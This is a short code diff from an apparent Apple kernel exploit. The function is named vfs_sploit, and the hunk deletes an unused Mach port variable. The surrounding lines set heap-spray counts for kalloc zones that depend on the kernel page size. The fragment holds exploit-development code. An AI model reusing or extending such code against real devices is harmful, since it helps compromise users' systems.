@@ -435,8 +435,6 @@ void vfs_sploit() {
     // first off we're just trying to get the pages like that
     
     int INITIAL_PATTERN_REPEATS = kernel_page_size == 0x4000 ? 40 : 60;
-    mach_port_t kalloc_holder_port = MACH_PORT_NULL;
-    
     
     int kallocs_per_zcram = kernel_page_size/0x10; // 0x1000 with small kernel pages, 0x4000 with large
     int ports_per_zcram = kernel_page_size == 0x1000 ? 0x49 : 0x61;  // 0x3000 with small kernel pages, 0x4000 with large
